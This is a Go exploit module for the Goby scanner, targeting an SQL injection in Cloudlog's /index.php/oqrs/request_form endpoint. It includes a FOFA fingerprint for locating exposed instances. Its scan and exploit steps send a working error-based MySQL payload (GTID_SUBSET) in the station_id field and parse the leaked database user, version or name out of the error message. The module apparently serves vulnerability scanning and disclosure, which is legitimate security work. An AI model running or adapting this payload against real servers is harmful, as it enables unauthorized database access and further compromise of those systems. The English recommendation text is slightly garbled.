package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Cloudlog /index.php/oqrs/request_form SQL Injection Vulnerability",
    "Description": "<p>Cloudlog is a self hosted PHP application that allows you to record amateur radio contacts from anywhere. All you need is a web browser and an active internet connection.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Product": "Cloudlog",
    "Homepage": "https://github.com/magicbug/Cloudlog",
    "DisclosureDate": "2024-11-25",
    "PostTime": "2024-12-02",
    "Author": "1971714067@qq.com",
    "FofaQuery": "title=\"Login - Cloudlog\" && body=\"/assets/images/dot.png\"",
    "GobyQuery": "title=\"Login - Cloudlog\" && body=\"/assets/images/dot.png\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. The official has not yet fixed this vulnerability. Please contact the manufacturer to fix the vulnerability: <a href=\"https://github.com/magicbug/Cloudlog2.\">https://github.com/magicbug/Cloudlog2.</a> Deploy a web application firewall to monitor database operations.3. Unless necessary, public access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "USER,version,database",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "version",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/oqrs/request_form",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "87"
                },
                "data_type": "text",
                "data": "station_id=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(USER() AS NCHAR),0x20)),1,190))),666)"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Error Number: 1772",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Malformed GTID set specification",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/index.php/oqrs/request_form"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/oqrs/request_form",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "87"
                },
                "data_type": "text",
                "data": "station_id=GTID_SUBSET(CONCAT((MID((IFNULL(CAST({{{default}}}() AS NCHAR),0x20)),1,190))),666)"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Error Number: 1772",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Malformed GTID set specification",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "test|lastbody|regex|Malformed GTID set specification\\s+'([^']+)'",
                "output|lastbody|text|{{{test}}}",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "Cloudlog /index.php/oqrs/request_form SQL 注入漏洞",
            "Product": "Cloudlog",
            "Description": "<p>Cloudlog是一个自托管的PHP应用程序，允许您在任何地方记录业余无线电联系人。你所需要的只是一个网络浏览器和活跃的互联网连接。<br></p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/magicbug/Cloudlog\">https://github.com/magicbug/Cloudlog</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Cloudlog /index.php/oqrs/request_form SQL Injection Vulnerability",
            "Product": "Cloudlog",
            "Description": "<p>Cloudlog is a self hosted PHP application that allows you to record amateur radio contacts from anywhere. All you need is a web browser and an active internet connection.<br></p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. The official has not yet fixed this vulnerability. Please contact the manufacturer to fix the vulnerability: <a href=\"https://github.com/magicbug/Cloudlog2.\">https://github.com/magicbug/Cloudlog2.</a> Deploy a web application firewall to monitor database operations.3. Unless necessary, public access to the system is prohibited.<br><br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "databases": "NULL|text|databases",
        "user": "NULL|text|user"
    },
    "PocId": "9975"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}